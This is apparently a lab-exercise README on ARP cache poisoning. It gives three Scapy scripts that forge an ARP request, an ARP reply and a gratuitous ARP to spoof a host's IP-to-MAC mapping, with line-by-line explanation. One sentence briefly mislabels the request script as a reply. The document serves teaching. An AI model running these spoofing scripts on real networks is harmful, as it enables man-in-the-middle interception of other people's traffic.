# ARP Spoofing Attack
The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as the MAC address, given an IP address. The ARP protocol is a very simple protocol, and it does not implement any security measure.

![diagram](https://user-images.githubusercontent.com/126002808/220416965-09b077df-d999-478f-bdf3-78c42b4dcb50.png)

## ARP Request
```
#!/usr/bin/env python3
from scapy.all import *

# Create Ethernet and ARP objects
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69')
arp = ARP(op=1, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')

# Echo message before sending packet
print("Nigel is sending an ARP request")

# Send the packet
sendp(ethernet/arp) 
```

This script is using Scapy, a Python-based packet manipulation tool, to send an ARP reply packet. <br/>
This script is using the Scapy library to create and send an Address Resolution Protocol (ARP) request packet.<br/> 

An ARP request packet is used to discover the hardware address (MAC address) of a device on the same network by broadcasting a request to all devices on the network. The script creates two objects: <br/>

1) an Ethernet object
2) ARP object

The Ethernet object is used to define the source and destination MAC addresses of the packet. <br/>
The ARP object is used to define the operation code, source and destination IP addresses, and source and destination MAC addresses of the packet. <br/>
<br/>
The script then uses the print statement to display a message to the console indicating that Nigel is sending an ARP request. Finally, the script sends the packet using the sendp() function from the Scapy library.
<br/>
The first line ```#!/usr/bin/env python3``` is known as the shebang line.<br/>
It tells the operating system to use the Python 3 interpreter to execute the script. <br/>
<br/>
The second line from ```scapy.all import *``` imports all of the classes and functions in the Scapy library. <br/>
This allows the script to use Scapy to create, manipulate and send network packets. <br/>
<br/>
It first creates Ethernet and ARP objects to define the packet's source and destination addresses, as well as the IP addresses involved. <br/>
It then prints the message ```"Nigel is sending an ARP request"``` before sending the packet using the ```sendp``` function.


![arp-req](https://user-images.githubusercontent.com/126002808/220420309-b15b1cf7-e7ce-4ac4-a7c1-ccddfae3b901.png)

## ARP Reply
```
#!/usr/bin/env python3  
from scapy.all import *  
# Create Ethernet and ARP objects  
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69') 
# ARP reply uses op-2. Previously, ARP request used op=1 
arp = ARP(op=2, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')  
# Print the message that Nigel is sending an ARP reply
print("Nigel is sending an ARP reply")
# Send the packet 
sendp(ethernet/arp)  
```

Similar to the first script, we create an Ethernet frame with a specified source and destination MAC address. <br/>
The next line creates an ARP packet, with a specified source and destination MAC and IP addresses <br/>
This specifies that it is an ARP reply packet by setting the ```'op'``` field to ```2.``` <br/>
<br/>
The line ```print("Nigel is sending an ARP reply")``` prints a message to the console stating that Nigel is sending an ARP reply packet. <br/>
<br/>
Finally, the ```sendp(ethernet/arp)``` function sends the Ethernet frame and ARP packet as a single packet over the network using Scapy's ```sendp()``` function.

![arp-rep](https://user-images.githubusercontent.com/126002808/220423164-cff058a6-8371-4466-8461-b672a09df364.png)


## Gratuitous ARP
```
#!/usr/bin/env python3
from scapy.all import *

# Create Ethernet and ARP objects
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69')
arp = ARP(op=2, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='ff:ff:ff:ff:ff:ff', psrc='10.9.0.5')

# Print the message that Nigel is sending a Gratuitous ARP message
print("Nigel is sending a Gratuitous ARP message")

# Send the packet
sendp(ethernet/arp)
```

![grat-arp](https://user-images.githubusercontent.com/126002808/220428701-fd8a00ac-fefd-46bf-a947-6e7438630782.png)



